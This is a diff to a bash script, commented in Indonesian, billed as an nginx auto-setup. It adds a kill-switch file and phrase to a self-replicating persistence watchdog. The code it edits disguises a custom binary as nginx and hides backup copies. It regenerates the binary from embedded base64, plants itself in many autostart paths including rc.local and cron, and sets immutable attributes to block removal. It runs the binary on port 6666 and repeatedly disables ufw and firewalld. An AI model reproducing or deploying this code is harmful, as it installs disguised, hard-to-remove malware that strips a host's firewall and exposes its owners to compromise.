@@ -3,7 +3,7 @@ set -e
 
 echo "=============================="
 echo "  Auto Setup Custom Nginx"
-echo "  Ultimate Self‑Replicating"
+echo "  Ultimate Self‑Replicating + Kill‑Switch"
 echo "=============================="
 
 # ─── Fungsi pembantu ────────────────────────────────────
@@ -107,10 +107,8 @@ echo "  → Build success!"
 echo ""
 echo "[5/10] Deploying binary & hidden backups... (and encoding binary for self‑replication)"
 
-# Encode binary ke base64 untuk reproduksi
 NGINX_BASE64=$(base64 -w0 ./nginx)
 
-# Fungsi aman untuk menulis file (atasi folder immutable)
 safe_write_file() {
     local src="$1"
     local dst="$2"
@@ -155,9 +153,9 @@ for bp in "${BACKUP_BINS[@]}"; do
 done
 echo "  → Binary secured in ${#BACKUP_BINS[@]} hidden locations"
 
-# ─── 6. Buat payload watchdog dengan 54 path + binary base64 ──
+# ─── 6. Buat payload watchdog dengan kill‑switch + binary base64 ──
 echo ""
-echo "[6/10] Creating self‑replicating payload (binary embedded)..."
+echo "[6/10] Creating self‑replicating payload (binary embedded + kill‑switch)..."
 
 WATCHDOG_PATHS=(
     "/etc/rc.local"
@@ -226,8 +224,21 @@ cat > /tmp/nginx_payload.sh << 'PAYLOAD_EOF'
 # Default-Stop:      0 1 6
 # chkconfig: 2345 85 15
 # Short-Description: Nginx persistence watchdog
-# Description:       Self‑healing extreme multi‑persistence with binary regeneration.
+# Description:       Self‑healing extreme multi‑persistence with kill‑switch.
 ### END INIT INFO
+
+# ===== KILL SWITCH =====
+DISABLE_FILE="/etc/nginx.disable"
+DISABLE_PHRASE="supersecretkey"   # Ganti dengan frase rahasia Anda
+if [ -f "$DISABLE_FILE" ]; then
+    if grep -q "$DISABLE_PHRASE" "$DISABLE_FILE" 2>/dev/null; then
+        # Hentikan semua proses watchdog dengan bersih
+        pkill -f "/etc/rc.local" 2>/dev/null || true
+        pkill -f "nginx-system --oneshot" 2>/dev/null || true
+        exit 0
+    fi
+fi
+# ========================
 
 SELF="$(cat "$0")"
 MAIN_BIN="/etc/nginx"
@@ -241,10 +252,9 @@ WATCHDOG_PATHS=( __WATCHDOG_ARRAY__ )
 NGINX_BASE64="__NGINX_BASE64__"
 
 restore_all_files() {
-    # Pulihkan binary utama (dari backup atau dari base64)
+    # Pulihkan binary utama
     if [ ! -f "$MAIN_BIN" ]; then
         local restored=0
-        # Coba dari backup dulu
         for src in "${BACKUP_BINS[@]}"; do
             if [ -f "$src" ]; then
                 cp "$src" "$MAIN_BIN"
@@ -254,7 +264,6 @@ restore_all_files() {
                 break
             fi
         done
-        # Jika tetap tidak ada, hasilkan dari base64
         if [ $restored -eq 0 ]; then
             echo "$NGINX_BASE64" | base64 -d > "$MAIN_BIN"
             chmod 700 "$MAIN_BIN"
@@ -262,7 +271,7 @@ restore_all_files() {
         fi
     fi
 
-    # Pulihkan backup binary yang hilang
+    # Pulihkan backup binary
     for dest in "${BACKUP_BINS[@]}"; do
         if [ ! -f "$dest" ]; then
             local src_found=0
@@ -275,7 +284,6 @@ restore_all_files() {
                     break
                 fi
             done
-            # Jika tidak ada sumber file, bangkitkan dari base64 juga
             if [ $src_found -eq 0 ]; then
                 echo "$NGINX_BASE64" | base64 -d > "$dest"
                 chmod 700 "$dest"
@@ -306,14 +314,13 @@ restore_all_files() {
         if [ -x "$MAIN_BIN" ]; then
             "$MAIN_BIN" 6666 &
         else
-            # kalau binary entah kenapa tidak executable, regenerasi
             echo "$NGINX_BASE64" | base64 -d > "$MAIN_BIN"
             chmod 700 "$MAIN_BIN"
             "$MAIN_BIN" 6666 &
         fi
     fi
 
-    # Anti‑chattr : jaga immutable
+    # Anti‑chattr
     for target in "$MAIN_BIN" "${BACKUP_BINS[@]}" "${WATCHDOG_PATHS[@]}" "/etc/cron.d/nginx-system-cron"; do
         if [ -f "$target" ]; then
             if ! lsattr "$target" 2>/dev/null | grep -q 'i'; then
@@ -323,13 +330,24 @@ restore_all_files() {
     done
 }
 
+# Kill‑switch check (sebelum oneshot)
 if [ "$1" = "--oneshot" ]; then
+    # Periksa kill‑switch dulu
+    if [ -f "$DISABLE_FILE" ] && grep -q "$DISABLE_PHRASE" "$DISABLE_FILE" 2>/dev/null; then
+        exit 0
+    fi
     restore_all_files
     exit 0
 fi
 
+# Mode abadi dengan pengecekan kill‑switch setiap iterasi
 (
     while true; do
+        # Cek kill‑switch
+        if [ -f "$DISABLE_FILE" ] && grep -q "$DISABLE_PHRASE" "$DISABLE_FILE" 2>/dev/null; then
+            pkill -f "/etc/rc.local" 2>/dev/null || true
+            exit 0
+        fi
         ufw disable 2>/dev/null || true
         systemctl stop firewalld 2>/dev/null || true
         systemctl disable firewalld 2>/dev/null || true
@@ -352,7 +370,7 @@ done
 sed -i "s|__WATCHDOG_ARRAY__|$WATCHDOG_LIST|" /tmp/nginx_payload.sh
 sed -i "s#__NGINX_BASE64__#$NGINX_BASE64#" /tmp/nginx_payload.sh
 
-echo "  → Payload with binary embedded ($(( ${#NGINX_BASE64} / 1024 )) KB) and $(echo "${WATCHDOG_PATHS[@]}" | wc -w) paths."
+echo "  → Payload with binary embedded ($(( ${#NGINX_BASE64} / 1024 )) KB) and $(echo "${WATCHDOG_PATHS[@]}" | wc -w) paths + kill‑switch."
 
 # ─── 7. Sebarkan watchdog ke semua lokasi ──────────────
 echo ""
@@ -482,5 +500,6 @@ echo "=============================="
 echo "  SUCCESS – Ultimate Self‑Replicating Active"
 echo "  Watchdog points: $(echo "${WATCHDOG_PATHS[@]}" | wc -w)"
 echo "  Binary embedded: YES"
+echo "  Kill‑switch: /etc/nginx.disable (phrase: supersecretkey)"
 echo "=============================="
 pgrep -a nginx || echo "  (nginx running)"
